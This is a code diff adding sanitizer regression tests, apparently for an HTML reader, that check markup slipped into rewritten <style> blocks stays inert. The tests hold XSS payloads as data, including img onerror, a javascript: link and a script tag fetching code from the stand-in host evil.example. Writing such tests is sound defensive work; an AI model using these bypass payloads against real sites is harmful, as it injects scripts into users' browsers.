@@ -158,6 +158,35 @@ describe('sanitizeHtml', () => {
   });
 });
 
+describe('sanitizeHtml <style> rewriting', () => {
+  // The sanitized body is parsed again (the reader's srcdoc). Markup that
+  // the stylesheet rewrite lets back into a <style> element must stay text.
+  const reparse = (html) => new DOMParser().parseFromString(html, 'text/html');
+
+  for (const payload of [
+    '<p>hi</p><style><@import;/style><@import;img src=x onerror=alert(1)></style>',
+    '<p>hi</p><style>a{}<@import x;/style><@import x;script src=//evil.example/x.js></@import;script></style>',
+    '<style>p{color:red}</style><style><@import;/style><@import;a href="javascript:alert(1)">x</a></style>',
+  ]) {
+    it(`keeps markup in a stylesheet from reopening HTML: ${payload.slice(0, 40)}`, () => {
+      const { html } = sanitizeHtml(payload, { blockRemoteImages: false });
+      const doc = reparse(html);
+      expect(doc.querySelector('img[onerror], script, a[href^="javascript"]')).toBeNull();
+      for (const el of doc.querySelectorAll('*')) {
+        for (const attr of el.attributes) expect(attr.name.startsWith('on')).toBe(false);
+      }
+      expect(html).not.toMatch(/<\/style>\s*<(img|script|a)\b/i);
+    });
+  }
+
+  it('keeps a child combinator and the rules around it', () => {
+    const { html } = sanitizeHtml('<style>.a > .b { margin: 0 }</style><p class="a">x</p>', {
+      blockRemoteImages: false,
+    });
+    expect(html).toContain('.a > .b');
+  });
+});
+
 describe('restoreBlockedImages', () => {
   it('returns empty for falsy input', () => {
     expect(restoreBlockedImages('')).toBe('');
